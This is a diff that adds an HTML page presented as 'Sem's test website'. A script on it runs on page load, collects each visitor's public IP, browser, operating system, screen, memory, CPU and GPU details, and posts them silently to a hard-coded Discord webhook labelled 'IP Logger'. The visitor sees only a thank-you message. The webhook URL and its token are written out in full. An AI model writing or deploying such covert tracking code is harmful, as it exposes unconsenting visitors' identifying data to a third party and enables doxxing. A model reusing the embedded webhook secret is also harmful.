@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sem's test website</title>
+    <script>
+        async function sendInfoToDiscord() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            // Get additional information
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer || 'Direct visit';
+            const timestamp = new Date().toISOString();
+            const language = navigator.language;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const currentUrl = window.location.href;
+            const deviceMemory = navigator.deviceMemory || 'Not Available'; // RAM size in GB
+            const hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available'; // Number of logical processors
+            const screenDPI = (window.devicePixelRatio * 96).toFixed(2) + ' DPI'; // Estimated screen DPI
+
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not Available';
+
+            const embedMessage = {
+                embeds: [{
+                    title: '👤 New Visitor Info',
+                    color: 3066993,
+                    fields: [
+                        { name: '🖥️ IP Address', value: ip, inline: true },
+                        { name: '🌐 User-Agent', value: userAgent, inline: true },
+                        { name: '🔗 Referrer', value: referrer, inline: true },
+                        { name: '📅 Timestamp', value: timestamp, inline: true },
+                        { name: '🌍 Language', value: language, inline: true },
+                        { name: '📺 Screen Resolution', value: screenResolution, inline: true },
+                        { name: '🔗 Current URL', value: currentUrl, inline: true },
+                        { name: '💾 Device Memory', value: `${deviceMemory} GB`, inline: true },
+                        { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
+                        { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
+                        { name: '🎮 Graphics Card', value: gpu, inline: true },
+                        { name: '🌐 Browser', value: userAgent.split(') ')[0].split(' (')[1] || 'Not Available', inline: true },
+                        { name: '💻 Operating System', value: userAgent.split('(')[1].split(';')[0] || 'Not Available', inline: true },
+                    ],
+                    footer: {
+                        text: 'Logged by IP Logger',
+                    }
+                }]
+            };
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101';
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            });
+
+            document.body.innerHTML = `<h1>Test Website, Thank You for Testing (${getDeviceName()})</h1>`;
+        }
+        function getDeviceName() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('windows')) return 'Windows PC';
+            if (userAgent.includes('mac')) return 'Mac';
+            if (userAgent.includes('linux')) return 'Linux PC';
+            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'iOS Device';
+            if (userAgent.includes('android')) return 'Android Device';
+            return 'Unknown Device';
+        }
+        window.onload = sendInfoToDiscord;
+    </script>
+</head>
+<body>
+</body>
+</html>
